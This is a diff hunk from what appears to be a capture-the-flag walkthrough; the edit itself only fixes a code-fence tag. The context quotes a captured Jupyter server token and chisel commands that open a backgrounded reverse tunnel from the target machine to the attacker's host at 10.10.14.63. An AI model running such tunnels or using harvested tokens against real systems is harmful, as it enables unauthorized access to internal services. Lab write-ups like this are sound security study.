@@ -30,7 +30,7 @@ With this, we got crucial informations: users, token, server.py is running throu
 The token is --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 .
 
 We set port forwarding with chisel
-```b ash
+```bash
 chisel server --port 8080 --reverse #on my host
 
 Then I had to run the following commmand on the target machine nohup ./chisel client 10.10.14.63:8080 R:8888:localhost:8888 > /dev/null 2>&1 &
